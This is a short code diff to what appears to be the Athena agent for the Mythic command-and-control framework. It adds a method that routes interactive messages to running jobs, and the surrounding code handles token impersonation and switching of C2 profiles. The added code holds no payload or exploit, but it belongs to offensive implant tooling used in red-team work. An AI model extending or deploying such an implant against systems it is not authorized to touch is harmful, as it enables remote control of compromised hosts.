@@ -1,5 +1,6 @@
 using Athena.Handler.Common.FileSystem;
 using Athena.Models.Commands;
+using Athena.Models.Comms.Tasks;
 using Athena.Models.Mythic.Tasks;
 using Athena.Models.Responses;
 using Athena.Utilities;
@@ -200,6 +201,20 @@ namespace Athena.Commands
                 await this.tokenHandler.ThreadRevert();
             }
         }
+
+        public async Task InteractWithJob(InteractiveMessage message)
+        {
+            //Get task name by ID
+            MythicJob job = TaskResponseHandler.activeJobs[message.task_id];
+
+            if(job is null)
+            {
+                return;
+            }
+
+            this.assemblyHandler.InteractWithAssembly(job.task.command, message);
+        }
+
 
         /// <summary>
         /// Switch the active c2 profile
